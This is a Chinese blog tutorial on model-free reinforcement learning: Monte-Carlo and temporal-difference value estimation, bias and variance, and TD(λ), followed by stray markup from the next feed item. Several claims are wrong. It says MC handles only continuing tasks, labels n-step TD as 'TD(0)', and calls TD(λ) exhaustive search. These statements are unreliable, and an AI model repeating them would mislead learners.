<p><strong>3、无模型强化学习过程：无模型预测-&gt;无模型控制</strong><br/>
（1）通过前面章节的学习，我们知道<strong>有模型强化学习DP</strong>的学习过程是分2步：第1步<strong>评估价值函数</strong>，第2步贪婪化迭代局部最优策略。如此循环这两步直到策略收敛到最优策略，done！</p>
<p>（2）同理，无模型强化学习也是要分两步：<br/>
第1步：就是用本章将要讲解的MC、TD、TD(λ)三个算法来<strong>无模型预测</strong>，或者说<strong>估计一个未知MDP的价值函数</strong>。在无模型强化学习中，这种计算价值的算法叫<strong>评估</strong>。所以本章的算法都<strong>只是</strong>用来计算<strong>状态价值</strong>的。</p>
<p>第2步：<strong>无模型控制</strong>，也就是<strong>优化一个未知MDP的价值函数</strong> 由于有些非完备MDP问题，比如投资、机器人行走等一些场景，虽然也可以看作是一个马尔可夫过程，但这个过程太复杂，我们可能根本连状态-行动-奖励的序列都无法描述出来，此时就需要无模型控制来解决这类问题。所以<strong>下一个篇章</strong>我们讲无模型控制。</p>
<p><strong>4、你必备的基础</strong><br/>
上面总结的一些结论，如果你看不明白，说明你还没有强化学习的基础，那本章你理解起来也会非常抽象和难懂，这也是为什么我们一开始就要花大量篇幅去讲DP的原因。你必须要彻底弄懂，第二章的<strong>增量式均值计算</strong>、<strong>指数移动平均</strong>，第三章的<strong>贝尔曼期望方程</strong>，第四章动态规划中的<strong>迭代策略评估</strong>，这些内容务必弄透了，本章的一些关键细节你就轻松拿下了。</p>
<h3 data-id="heading-1">二、蒙特卡洛学习(Monte-Carlo Learning)</h3>
<p><strong>1、MC的基本描述和基本思想</strong><br/>
蒙特卡洛学习，简称MC，是一个典型的无模型算法，主要用于计算非完备MDP中的状态价值。<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a899482d1c0949f4af0de122445fbf1a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5a6d6LSd5YS_5aW9:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770863463&amp;x-signature=7PYyz4%2FSaInoAB%2ByCmv51nz41no%3D" alt="" loading="lazy"/>（1）MC方法是需要<strong>agent和环境进行交互的</strong>，因为有交互才可以获得交互数据，然后从交互数据中计算状态价值。</p>
<p>（2）MC方法要求agent得<strong>从头打到游戏结束</strong>。所以MC只能用于<strong>有分幕的情况</strong>，就是要有游戏结束的情况。为什么要达到游戏结束呢？因为MC计算状态价值是通过一条条幕计算均值的，而计算过程是从终止状态一步步回溯计算的，游戏不打完就没法算啊！</p>
<p>（3）MC就是用样本均值估计总体均值的方法，就是用样本均值逼近总体均值，或者说就是用频率逼近概率的思路。在完备的MDP中我们是有状态转移矩阵的，所以可以用概率算出状态价值的期望，但是无模型是不知道系统状态是如何转移的，所以只能通过实实在在走出的一条条幕，通过这些幕中的状态<strong>实际回报</strong>的<strong>均值</strong>来估计状态价值。</p>
<p><strong>2、MC具体是如何计算状态价值的？</strong><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/53fc8bcd4f9342f2bdac5c9da01d5356~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5a6d6LSd5YS_5aW9:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770863463&amp;x-signature=N3QhsnaOraxiNz6akFzo1LbY4OI%3D" alt="" loading="lazy"/>（1）MC可以通过上面两种方法来计算状态价值：<strong>first-visit</strong>或者<strong>every-visit</strong>。</p>
<p>（2）上图是agent实实在在的打了6轮游戏，产生了6条分幕，我们现在是要通过这6条分幕来计算状态价值的。<br/>
注意：这6条分幕必须是同一个策略下的游戏序列！不能是不同策略下的序列！因为不同策略对应着不同的价值函数。现在我们只是计算价值函数，不是提升策略，提升策略下一个章节讲。</p>
<p>（3）上左图是利用这6条分幕来计算状态s0的价值值的示例。具体做法是：</p>
<blockquote>
<p>首先在每条分幕中找到状态s0<strong>第一次出现</strong>的地方。比如分幕1中，s0第一出现在a处，虽然b处也出现了s0，但是不用管b处，我们只计算a处s0的价值，这也是为什么叫first-visit的原因。那a处s0的价值=其后所有状态的系统奖励和。这是为什么MC必须要求agent从头打完一整局游戏，必须有终止状态，否则没法算啊。<strong>如此便算出了第一个s0的价值值</strong>。</p>
<p>同理，观察分幕2中s0出现的位置，发现分幕2中压根就没出现状态s0，那就弃用这条分幕！</p>
<p>同理，计算分幕3、分幕4、分幕6中的s0价值值。这样就又得到3个s0的价值值。</p>
<p>最后，求这4个s0价值值的均值，<strong>就得到状态s0的价值值</strong>。</p>
<p>如此方法计算其他状态的价值。</p>
</blockquote>
<p>（4）上右图：方法2示例的也是<strong>如何计算状态s0的价值值</strong>。但是every-visit采用的是，<strong>只要幕中出现状态s0，就统统计算其价值值</strong>，然后求平均，平均值就是s0的价值值。简单粗暴。</p>
<p>（5）我们一般<strong>多数</strong>用的是every-visit方式。anyway，不管是first-visit还是every-visit，很多时候都是可以收敛的，所以这两种方法差别不大，你随便选一种即可，不必纠结。</p>
<p><strong>3、增量式MC、指数移动平均MC</strong><br/>
MC的原理非常非常简单，但是工程实现上还有<strong>两个技巧</strong>：<br/>
（1）对于稳态环境问题，工程上一般是用<strong>增量</strong>(incremental)来计算价值均值的，也就是我们常说的<strong>增量式MC</strong>。</p>
<blockquote>
<p>为什么会有增量式MC？</p>
<p>首先，比如上面first-visit和every-visit求s0的示例中，是智能体一次性打完6轮游戏，拿到6条分幕的数据，然后才开始计算s0。那在工程实现上，是不是得保留6条分幕的所有数据后，才能计算状态价值。如果一个游戏要玩数十万轮数百万轮计算结果才可靠，那不就得要保存数十万条数百万条分幕！其实没必要，我们的目的<strong>只是计算均值而已</strong>，所以我们可以在agent打完第1条分幕后，就计算一次s0，agent继续打完第2条分幕后，再计算(更新)一次s0，如此不断更新即可。这样之前打的分幕就没必要保存了，这样就更节省内存和算力了。所以，现实中我们不是坐等agent打完数十万数百万轮游戏后再计算，一般都是打完一局游戏就计算一次。</p>
<p>其次，<strong>增量式MC的计算结果和总体求平均的结果是一样的</strong>，而且<strong>各项的权重是一样的</strong>。</p>
</blockquote>
<p>（2）对于非稳态环境问题，一般是用<strong>指数移动平均</strong>来计算价值均值的，也就是我们常说的<strong>指数移动平均MC</strong>。</p>
<blockquote>
<p>为什么会有指数移动平均MC？</p>
<p>稳态环境就是比如agent打游戏，每次打到状态s1，并且agent做了a1动作后，系统转移到其他状态的概率是稳定的。这种情况我们一般称为稳态。非稳态就是agent打到状态s1并且做了a1动作后，系统迁移到其他状态是飘忽不定的，就是没有一个固定概率的转移集合。这种情况就是非稳态情况。此时如果agent再按照之前打游戏的经验来打本轮游戏，岂不是会吃亏，因为之前的经验不可靠了，所以此时就得用<strong>指数移动平均</strong>来计算价值，就是在计算时，给最近轮次的经验更高的权重，越往前的经验给更小的权重。</p>
</blockquote>
<p>（3）<strong>增量式MC</strong>和<strong>指数移动平均MC</strong>的迭代过程的<strong>数学表示</strong>：<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/063d487046f94aca81f327da9a088a32~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5a6d6LSd5YS_5aW9:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770863463&amp;x-signature=OWRZpy4idF7xkblLwmkHX7mj%2B7M%3D" alt="" loading="lazy"/>（4）下面我再用一个小例子对比一下增量式MC、指数移动平均MC之间的各项权重的差异，因为不管是这里的非稳态MC还是后面要讲的时序差分，都有α这个超参数，而且α对算法的收敛性的影响还很大，所以这里我们再直观的看看超参α在计算中的作用：<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3639ad71bb2a4128aecc0e5e25a10ad9~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5a6d6LSd5YS_5aW9:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770863463&amp;x-signature=Ip%2B8R5EgvudgOFh77BMrXD10Y5Q%3D" alt="" loading="lazy"/>从这个例子中我们可以清晰看到增量式MC和普通的求均值效果是一模一样的。但是指数移动平均MC的权重是一个指数递减的过程，例子中α=1/5，每次权重按照上次的20%速率进行递减，所以越往后权重越小。</p>
<p>其实不管是<strong>增量式计算状态价值</strong>还是<strong>指数移动平均计算状态</strong>，我在第二章都已经用<strong>实际例子</strong>和<strong>具体代码</strong>给大家展示过了：<a href="https://link.juejin.cn?target=https%3A%2F%2Fblog.csdn.net%2Ffriday1203%2Farticle%2Fdetails%2F155787017%3Fspm%3D1001.2014.3001.5501" target="_blank" title="https://blog.csdn.net/friday1203/article/details/155787017?spm=1001.2014.3001.5501" ref="nofollow noopener noreferrer">blog.csdn.net/friday1203/…</a> 还是不理解的同学可以回看我这篇博文中的例子。</p>
<p>至此，我们使用蒙特卡洛方法就计算出了<strong>策略Π下的系统状态价值</strong>。现在回看这部分的原理是不是特别特别简单和通俗！而且这个思想其实我在第三章讲<strong>状态收益</strong>(return)的时候就已经提到了。</p>
<h3 data-id="heading-2">三、时序差分学习(Temporal-Difference Learning)</h3>
<p><strong>1、时序差分是用来解决什么问题的？</strong><br/>
MC方法最大的缺点就是<strong>需要agent打完每一轮游戏</strong>，才能从一条条游戏序列<strong>episode</strong>中计算出状态价值。这样是非常低效的，比如有的复杂游戏需要打非常非常多轮，有的状态才出现一次，而且一轮游戏需要很长时间，那不是要采样到天荒地老了吗？而且有的游戏压根就没有结束状态，那MC就没法用了。<strong>时序差分学习</strong>就在这个场景下诞生了。</p>
<p>所以时序差分学习是用来计算<strong>无法进行分幕</strong>的、非完备的MDP中的状态价值的。也所以时序差分学习也是一个<strong>无模型强化学习方法</strong>。</p>
<p>所以，上面的MC算法只能<strong>离线学习</strong>，时序差分学习可以<strong>在线学习</strong>。</p>
<ul>
<li>
<p><strong>在线学习(Online Learning)和离线学习(Offline Learning)</strong></p>
<blockquote>
<p>在线学习和离线学习是强化学习中的两种范式，描述的是<strong>数据的来源方式</strong>：你的算法在训练过程中是否能持续与环境交互，实时收集新数据？</p>
<p>（1）离线学习：表示游戏的轮次(可以是一个episode，也可以是多个episode)已经全部打完，然后再计算状态价值。比如MC就必须要至少打完一局游戏，才能开始计算状态价值，所以MC是离线学习。</p>
<p>（2）在线学习：表示边打游戏边计算状态价值，或者说，甚至可以打一步游戏就评估一次状态价值。比如TD就是在线进学习。</p>
</blockquote>
</li>
</ul>
<p>就是MC学的是Π策略下的episode,而时序差分可以学Π策略下的trajectory，也就是只要有Π策略下的(st,rt+1,st+1)片段就可以用TD进行价值评估了。<br/>
TD learning is online.It can update the state/action values immediately after receiving a reward.<br/>
MC learning is offline.It has to wait until an episode has been completely collected.</p>
<p>也所以TD可以处理episodic tasks 和 continuing tasks。而MC只能处理continuing tasks。</p>
<p><strong>2、时序差分的基本描述和基本思想</strong><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1f9e3540bf7447688bc03b15d14a60cc~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5a6d6LSd5YS_5aW9:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770863463&amp;x-signature=XzRwKnCysidz8Fq9CsFaMjoziJU%3D" alt="" loading="lazy"/>（1）上图左边是<strong>时序差分的基本描述</strong>。中间是<strong>非稳态的every-visit蒙特卡洛学习</strong>。右边是<strong>最简单的时序差分学习</strong>。将TD和MC放一起因为TD是对MC的改进算法，方便对二者进行对比。</p>
<p>（2）A处：前面讲<strong>动态规划</strong>时的<strong>迭代策略评估</strong>中，当时就说那个迭代过程叫<strong>自举</strong> bootstrapping，就是<strong>从一组非收敛的</strong>状态价值迭代到<strong>一组收敛的</strong>状态价值！或者说就是，通过一组预测值来预测另外一组预测值，就这样不断地预测，最后还能预测正确值！其实这也是强化学习最大的缺点，也是导致强化学习的收敛性一直都是一个行业问题。所以在很多复杂情况下，强化学习的收敛性一直是无法证明的。</p>
<p>此处你可以类比<strong>梯度下降算法</strong>，梯度下降算法也是从一个随机状态出发，一步步迭代，虽然收敛到全局最优处比较难，但是找到一个局部最优还是可以的。其实梯度下降算法也是bootstrapping的迭代过程。</p>
<p>由于TD主要是用于无模型情景，所以TD算法是从一个随机的初始状态出发，然后通过后来的实际数据，计算TD error，通过TD error一步步矫正预测，最后得到最优解。The TD error can be interpreted as innovation, which means new information obtained from experience(st, rt+1,st+1)。这里的experience就是实实在在打几步的游戏序列数据。</p>
<p>TD bootstraps because the update of a value relies on the previous estimate of this value. Hence, it requires initial guesses.<br/>
MC is not bootstrapping, because it can directly estimate state/action values without any initial guess.</p>
<p>（3）C处：A处说TD是通过不断地自举迭代来计算<strong>收敛的状态价值</strong>的。那TD具体如何自举迭代的呢？就是<strong>上图C处的式子</strong>，这个式子就是TD自举的过程。</p>
<ul>
<li>我们先看C处<strong>灰框中的红色字体部分</strong>：</li>
</ul>
<blockquote>
<p>它不就是前面第三章中的<strong>贝尔曼期望方程</strong>的形式之一嘛！可见，又是把无限计算变成有限局部关系的戏码！</p>
<p>MC计算收敛的状态价值时，是得agent实实在在地打了很多步游戏，游戏中的每个状态都需要出现很多次，才能逼近真实的期望Gt。所以MC算法是用<strong>实际回报</strong>来更新迭代状态价值，直到逼近到真正的状态价值(也就是收敛的状态价值)。但是很多时候，尤其是有些复杂游戏，状态个数非常多的游戏，MC就没法算了，因为可能有些状态MC都打了1万轮了也没碰到过，所以此时就得用TD了。</p>
<p>TD就非常高明了，我想它一定是借鉴了<strong>贝尔曼期望方程</strong>的思路：TD由于没有像MC那样打了很多幕的游戏，有很多信息，TD可能只打了几步游戏，所以对于TD来说，既然整体无法求解，那我就观察局部，我找出局部之间的关系，让一个无限的东西变成了一个递推式，就让<strong>无限变成了有限</strong>。就是TD<strong>玩的游戏的步数</strong>是无限的，但是TD可能就只玩了几步，那想从无限的游戏中算出Gt，就只能列出游戏中<strong>有限状态之间</strong>的Gt的关系！所以TD用的是<strong>估计回报</strong>来更新迭代状态价值的。这里你可以类比<strong>动态规划</strong>中的<strong>迭代策略评估</strong>，通过预测值来预测另外一组预测值，一轮轮预测，最后也能收敛到真正的状态价值。</p>
<p>也所以，这里的<strong>γ是回报的折扣因子</strong>。和我们计算第三章中计算状态回报公式中的γ含义一样！！</p>
</blockquote>
<ul>
<li>下面我们再看<strong>C处整个式子</strong>：</li>
</ul>
<blockquote>
<p>C处整个式子表示的是TD是<strong>如何迭代到收敛的状态价值</strong>的过程。TD还是<strong>不同于</strong>动态规划中的迭代策略评估的，第三章讲同步DP和异步DP时，都是一次迭代，就更新了全部的状态价值，就是从v0-&gt;v1-&gt;v2-v3-&gt;...一直收敛的v。但是TD的迭代方式式<strong>不同</strong>于DP。TD是迭代一次，迭代的是<strong>差异</strong>：v0 --&gt; v1' =v0+α(v1-v0) --&gt; v2'=v1'+α(v2-v1') --&gt; v3'=v2'+α(v3-v2') --&gt;.....直到得到收敛的一组状态价值，停止迭代。</p>
<p>所以TD叫时序差分学习！因为它迭代的是状态序列之间的价值差值。</p>
<p>说明：这里的<strong>α</strong>是<strong>迭代状态价值时，经验的折扣因子</strong>！意思就是在迭代计算状态价值，α参数是给当前经验和过去经验的权重参数。在非稳态环境中，过去的经验可能参考性要小很多，因为几个动作下来，已经时过境迁了，环境已经发生了很大的变化，所以当前经验比过去经验要更可信，所以参数α是调整当前经验和过去经验的参数。一定要和γ区别开。二者含义天差地别的。</p>
</blockquote>
<p>（4）B处：B处是MC的迭代过程，在讲MC时<strong>已经讲过</strong>它的原理了。这里想说的是，TD算法(C处)是MC算法(B处)的<strong>改进算法</strong>，改的仅仅是<strong>Gt的计算方式</strong>。MC计算Gt是通过一条条实际打出来的<strong>幕</strong>中回溯计算而得的<strong>实际回报</strong>，而TD则是利用<strong>贝尔曼期望方程</strong>估计的回报。也所以<strong>MC和TD的本质差异</strong>是：</p>
<blockquote>
<p><strong>MC没有利用马尔可夫性</strong>，所以MC通常在非马尔可夫环境中更有效。<br/>
<strong>TD利用了马尔可夫性</strong>，所以TD通常在马尔可夫环境中效率更高。</p>
</blockquote>
<p>为什么会有这样的差异呢？MC有实实在在的游戏回合数据啊，而TD没有！TD对应的是无终止状态的游戏，而且很可能只有打了几步游戏的有限数据啊。</p>
<p>（5）小结：<br/>
直观理解就是：<strong>TD算法是在没有模型的情况下来求解贝尔曼公式</strong>。TD algorithm solves the Bellaman equation of a given policy。</p>
<p>没有模型就得有数据，没有数据就得有模型，不然就没法学！</p>
<p><strong>3、MC和TD的使用场景对比</strong><br/>
时序差分是现在很多强化学习方法的依据，也就是说，<strong>现在很多强化学习方法是依据时序差分来做的</strong>。因为TD只要采集<strong>当下动作的系统奖励</strong>和<strong>下一个状态的以前的价值值</strong>即可，TD就可以迭代一组<strong>新的</strong>系统状态价值了。而MC的计算<strong>不仅</strong>需要当下动作的系统奖励，<strong>还要</strong>当下状态以后的所有状态的系统奖励。当我们无法采集到很多后续状态的系统奖励时，MC算法就无能为力了，此时TD算法就可堪大任。<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9ef608bdb9d9400694a851a96216f1c1~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5a6d6LSd5YS_5aW9:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770863463&amp;x-signature=Ae9sK7VydbUQdeecNKYkEdf4k%2FY%3D" alt="" loading="lazy"/>此外：</p>
<p>（1）<strong>在训练过程中，TD一般会比MC收敛的快一些</strong>。<br/>
（2）<strong>α大小的设置也是影响模型收敛的重要因素</strong>。有时α设置得不合适，模型可能都无法收敛。</p>
<h3 data-id="heading-3">四、强化学习中的几个重要概念和常识</h3>
<p><strong>1、真实值和估计值的表示</strong><br/>
在强化学习领域，人们习惯用符号v或V来表示状态价值(v是value的首字母)。但是一般用小v表示"系统中的所有状态的<strong>真实</strong>价值"，而大V表示"系统中的所有状态的<strong>估计</strong>价值"。我们一般是不知道一个系统中的所有状态的真实价值的，因此需要“估计”这个值。</p>
<p><strong>2、方差和偏差</strong><br/>
偏差和方差是机器学习中的一对儿重要概念，指的是模型在训练集和测试集上的表现。我们知道训练集都是一些已经切切实实发生了的样本数据，而测试集被看作是从总体中新抽样的数据。一个模型如果在训练集上表现很好，测试集上表现很糟，我们就说这个模型偏差小但方差大，过拟合了。如果一个模型在训练集上表现比较好，测试集上表现也可以，那我们就说这个模型拟合得比较好。在机器学习中，很多时候我们会故意牺牲一点训练集上的效果，来提升测试集的效果，也就是牺牲一点模型偏差来提升模型方差。</p>
<p>强化学习中也存在方差与偏差，比如MC和TD就是一个方差与偏差的问题：<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5c8113da904844588334779dfed65b64~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5a6d6LSd5YS_5aW9:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770863463&amp;x-signature=u7V0qyQdiHr1KP599ypoLAjz%2FZg%3D" alt="" loading="lazy"/>意思就是A处其实是有很多条轨迹的，比如A处有100步，每步有5个动作，那其实A序列是有5的100次方条的。所以由A计算的结果方差(variance)肯定大。</p>
<p>B处虽然方差不大，但偏差(mean/expectation)是bias(有偏)的，因为B处是极大依赖<strong>初始估计</strong>的，如果初始估计就是不准确的值，那B处的估计就也是不准确的。当然，如果B处有更多的数据参与估计，bias就会慢慢减小，直到最后可以收敛到一个正确的估计值。同理，MC是不涉及到任何初始值的，MC求出的期望就等于真实的state value或action value。所以MC是无偏的。</p>
<p><strong>3、小批量：Batch MC\TD</strong><br/>
在深度学习中，梯度下降优化算法就常用小批量(batch)样本来迭代损失函数，其好处和优点这里我就不展开说，感兴趣可以查看我之前的深度学习文章。</p>
<p>在强化学习中同样也有batch这个概念的，但强化学习中的batch操作稍微复杂一点：<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0a4b11b728cc45879dee3b4a132a5e0e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5a6d6LSd5YS_5aW9:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770863463&amp;x-signature=O0JZGnKmhGT0RuLD%2FptA6MUDfcU%3D" alt="" loading="lazy"/>注意：上面的K条分幕必须是同一个策略下的游戏序列！</p>
<p><strong>4、无模型强化学习的基本范式</strong><br/>
强化学习的最终目的是寻找最优策略的，就是如何让一个agent从小白逐渐成为高手的。这个目的一般由预测+控制来达到。<br/>
比如，在DP中我们是通过两步来寻找最优策略的，第一步是求收敛的价值函数，第二步贪婪化的更新策略，直到得到最优策略。那第一步就是<strong>预测</strong>，也叫<strong>评估和优化价值函数</strong>。第二步就是<strong>控制</strong>，也就是<strong>策略提升</strong>任务。</p>
<p>本章的MC\TD\TD(λ)都是<strong>无模型学习</strong>，也叫<strong>无模型评估</strong>，都是用于计算<strong>策略Π下的系统状态价值</strong>的，也就是解决预测任务的，后面紧接着就需要进行<strong>无模型控制</strong>。但是对于非完备的MDP问题，我们是不知道各个状态下的动作集合的，也不知道状态转移矩阵，所以就无法用像DP中的贪婪化方式寻找最优策略。所以<strong>无模型的控制任务</strong>要复杂很多，下一个篇章我们专门展开这个话题。</p>
<h3 data-id="heading-4">五、TD(λ)</h3>
<p><strong>1、TD(λ)是用来解决什么问题的？</strong><br/>
TD(λ)方法可以看作是<strong>蒙特卡洛方法和时序差分方法的混合</strong>。因为TD(0)最大的缺点是偏差大，MC最大的缺点是方差大，所以TD(λ)融合了二者，既继承了MC的偏差小优点，又继承了TD的方差小优点。</p>
<p><strong>2、TD(0)：n步TD</strong><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/be96e7c2d877448da4b2c4449069efdf~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5a6d6LSd5YS_5aW9:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770863463&amp;x-signature=m3EkAePr9s48jcOlN8tiEwAMfAk%3D" alt="" loading="lazy"/>前面我们学的TD，其实应该写成TD(0)，因为它计算状态价值时，用的序列样本都是比如走1步的序列片段，或者都是走2步的序列片段，或者都是走3步的序列片段，或者...，所以叫TD(0)。上左图中的"1步TD"、"2步TD"、"n步TD"都叫TD(0)。</p>
<p><strong>3、TD(0)-&gt;TD(λ)</strong><br/>
但是，在实际中，我们<strong>不是</strong>非得只采样1步的样本片段、或者只采样2步的样本片段，我们是可以采样<strong>随意步数</strong>的序列片段的，当然最大步数就是MC的步数：直到游戏结束。</p>
<p>当TD算法在计算状态价值时，用的样本是<strong>随意步数</strong>的序列片段、并且这些不同步长片段之间的<strong>权重</strong>按(1-λ)乘以λ的n-1次方(λ在0-1之间)来分配的权重的，用此时计算出来的Gt，来更新迭代状态价值时，我们叫TD(λ)，如下面右图所示：<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/963991e5f9294942a5c8bb68df2c7c21~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5a6d6LSd5YS_5aW9:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770863463&amp;x-signature=mCP2GYgkJTgCiNHRQ%2FqUrrIuTFc%3D" alt="" loading="lazy"/>由于TD算法主要应用于无终止状态的场景中，比如终止状态的游戏，所以步数n是趋向无穷大的，所以上图绿框中的权重分配方式也比较合理。打游戏的步数越长，权重就越低。这是合理的。因为此时TD就坍塌成MC了，就是所有的可能性都坍塌了，所以计算的价值虽然偏差小，但方差大。下图是绿框权重的衰减图：<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/330788647dd84ac181e430dea89410b1~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5a6d6LSd5YS_5aW9:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770863463&amp;x-signature=1yMKOmkegw2egJ0g9lyoswt3Blg%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-5">六、DP、MC、TD、TD(λ)对比总结1、MC和TD都需要采样，DP不需要采样。</h3>
<p>2、DP不用采样，因为能用DP解决问题，说明这个问题是一个完备的MDP问题，完备的MDP是知道系统的状态转移矩阵、系统奖励、以及每个状态下的动作集合的。所以DP<strong>根据概率</strong>就能<strong>准确</strong>求出<strong>期望价值</strong>，压根不需要采样。</p>
<p>3、MC是要实实在在打出一幕游戏数据，就是需要采样一条完整的序列，然后再计算状态价值。这可以看作是深度优先。</p>
<p>4、TD(0)是不用打完游戏，打完1步也可以算状态价值了。也就是TD(0)只需要采样序列片段就可以计算了。</p>
<p>5、TD(λ)是兼顾了深度的宽度探索，所以也叫暴力搜索、或者叫穷举法。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Exception异常架构设计：异常分类（02）]]></title>    <link>https://juejin.cn/post/7602901565025550345</link>    <guid>https://juejin.cn/post/7602901565025550345</guid>    <pubDate>2026-02-05T01:06:40.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7602901565025550345" data-draft-id="7602834985902293042" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Exception异常架构设计：异常分类（02）"/> <meta itemprop="keywords" content="运维,架构,自动化运维"/> <meta itemprop="datePublished" content="2026-02-05T01:06:40.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="老实巴交的麻匪"/> <meta itemprop="url" content="https://juejin.cn/user/4218156332615384"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Exception异常架构设计：异常分类（02）
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4218156332615384/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    老实巴交的麻匪
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-05T01:06:40.000Z" title="Thu Feb 05 2026 01:06:40 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-05
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    2
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读12分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>@charset "UTF-8";.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:15px;overflow-x:hidden;color:#333}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1:first-child,.markdown-body h2:first-child,.markdown-body h3:first-child,.markdown-body h4:first-child,.markdown-body h5:first-child,.markdown-body h6:first-child{margin-top:-1.5rem;margin-bottom:1rem}.markdown-body h1:before,.markdown-body h2:before,.markdown-body h3:before,.markdown-body h4:before,.markdown-body h5:before,.markdown-body h6:before{content:"#";display:inline-block;color:#3eaf7c;padding-right:.23em}.markdown-body h1{position:relative;font-size:2.5rem;margin-bottom:5px}.markdown-body h1:before{font-size:2.5rem}.markdown-body h2{padding-bottom:.5rem;font-size:2.2rem;border-bottom:1px solid #ececec}.markdown-body h3{font-size:1.5rem;padding-bottom:0}.markdown-body h4{font-size:1.25rem}.markdown-body h5{font-size:1rem}.markdown-body 